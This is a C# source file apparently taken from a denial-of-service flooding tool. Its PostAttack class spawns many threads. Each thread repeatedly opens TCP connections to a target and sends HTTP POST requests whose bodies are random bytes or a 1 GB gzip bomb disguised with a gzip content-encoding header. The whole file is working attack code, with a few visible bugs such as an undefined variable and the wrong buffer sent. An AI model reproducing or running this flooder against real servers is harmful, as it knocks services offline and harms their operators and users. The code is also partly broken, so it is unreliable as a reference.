#region Usings
using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Text;
using System.IO;
#endregion
namespace GAS.Core
{
    public class PostAttack : IAttacker
    {
        #region Variables
        bool init = false;
        public IPAddress IP, DNS;
        public string Subsite;
        private Random rnd = new Random();
        private bool random, usegZip, IPOrDns = true, Resp;
        private Thread[] WorkingThreads;
        private volatile int _attacktype = 0;
        private volatile string AttackHeader = "";
        byte[] GZIPBomb = Properties.Resources._1gbzeros;//contains gzipped dump of /dev/zero. gzipped size=1.2Mb, real = 1GB
        #endregion
        public PostAttack(string dns, string ip, int port, string subSite, bool resp, int delay, int timeout, bool random, bool usegzip, int threadcount)
        {
            ThreadCount = threadcount;
            WorkingThreads = new Thread[ThreadCount];
            this.IsDelayed = false;
            try { this.DNS = IPAddress.Parse(dns); }
            catch { this.DNS = this.IP; }
            try { this.IP = IPAddress.Parse(ip); }
            catch
            {
                this.IP = null;
                this.IPOrDns = false;
            }
            this.Port = port;
            this.Subsite = subSite;
            this.Resp = resp;
            this.Delay = delay;
            this.Timeout = timeout * 1000;
            this.random = random;
            this.usegZip = usegzip;
            States = new ReqState[ThreadCount];
            _attacktype = attacktype;

        }
        public override void Start()
        {
            if (IsFlooding)
                Stop();
            IsDelayed = false;
            IsFlooding = true;
            StringBuilder temp = new StringBuilder(6000);
            for (int k = 0; k < 1300; temp.Append(",5-" + (k++))) ;
            this.AttackHeader = temp.ToString();
            for (int i = 0; i < ThreadCount; i++)
                (WorkingThreads[i] = new Thread(new ParameterizedThreadStart(bw_DoWork))).Start(i);
            init = true;
        }
        private void bw_DoWork(object indexinthreads)
        {
            #region Wait 4 init
            while (!init)
                Thread.Sleep(100);
            int MY_INDEX_FOR_WORK = (int)indexinthreads;
            #endregion
            try
            {
                #region Prepare
                int bfsize = 1024; // this should be less than the MTU
                byte[] recvBuf = new byte[bfsize];
                int recvd = 0;
                byte[] buf;
                int snd = new Random().Next(1024 * 1024 * 64);
                #region Headers
                buf = System.Text.Encoding.ASCII.GetBytes(
                 String.Format("POST {0} HTTP/1.1\r\nHost: {2}\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n{3}\r\nContent-Type: {4}\r\nContent-Length: {5}\r\n\r\n",
                                       Subsite,
                                       Functions.RandomString(),
                                       DNS,
                                       ((usegZip) ? ("Content-Encoding: gzip" + Environment.NewLine) : ""),
                                       "application/x-www-form-urlencoded",
                                       random ? snd : GZIPBomb.Length));
                #endregion
                #endregion
                #region DDos
                while (IsFlooding)
                {
                    States[MY_INDEX_FOR_WORK] = ReqState.Ready;
                    recvBuf = new byte[bfsize];
                    #region Connect
                    Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    States[MY_INDEX_FOR_WORK] = ReqState.Connecting;
                    try { socket.Connect(this.IPOrDns ? IP : DNS, Port); }
                    catch { continue; }
                    socket.Blocking = Resp;
                    States[MY_INDEX_FOR_WORK] = ReqState.Requesting;
                    if (socket.Send(buf, SocketFlags.None) == buf.Length)//successfully connected
                    {
                        #region Upload
                        #region Random data
                        if (random)
                        {
                            int i = 0;
                            Random rnd = new Random();
                            int buflengt = 60000;
                            byte[] sendbuf = new byte[buflengt];
                            do
                            {
                                for (int o = 0; o < buflengt; sendbuf[o++] = (byte)rnd.Next(255)) ;
                            }
                            while ((i += socket.Send(buf, SocketFlags.None)) < snd);
                        }
                        #endregion
                        #region gzipbomb
                        else
                        {
                            int i = 0;//sent data
                            byte[] sendbuf = new byte[60000];//send buffer
                            MemoryStream mb = new MemoryStream(GZIPBomb);//stream to gzip bomb for comfortable usage
                            mb.Seek(0, SeekOrigin.Begin);
                            int r = 0;//read data
                            do
                            {
                                mb.Seek(i, SeekOrigin.Begin);//
                                if ((r = mb.Read(buf, 0, buf.Length)) < buf.Length)
                                    Array.Resize<byte>(ref buf, r);
                            }
                            while ((i += socket.Send(buf, SocketFlags.None)) < GZIPBomb.Length);
                        }
                        #endregion
                        #endregion
                    }
                    #endregion
                    States[MY_INDEX_FOR_WORK] = ReqState.Downloading;
                    Requested++;
                    #region Download page
                    if (Resp)
                    {
                        try
                        {
                            recvd = 0;
                            do { recvd = socket.Receive(recvBuf); }
                            while (false);//(recvd > bfsize) && socket.Connected);
                            Downloaded++;
                        }
                        catch { Failed++; }
                    }
                    #endregion
                    States[MY_INDEX_FOR_WORK] = ReqState.Completed;
                    Downloaded++;
                    if (Delay > 0) System.Threading.Thread.Sleep(Delay + 1);
                }
                #endregion
            }
            catch { }
            finally { }

        }
        public override void Stop()
        {
            IsFlooding = false;
            try
            {
                foreach (var x in WorkingThreads)
                {
                    try
                    {
                        x.Abort();
                    }
                    catch { }
                }
            }
            catch { }
        }
    }
}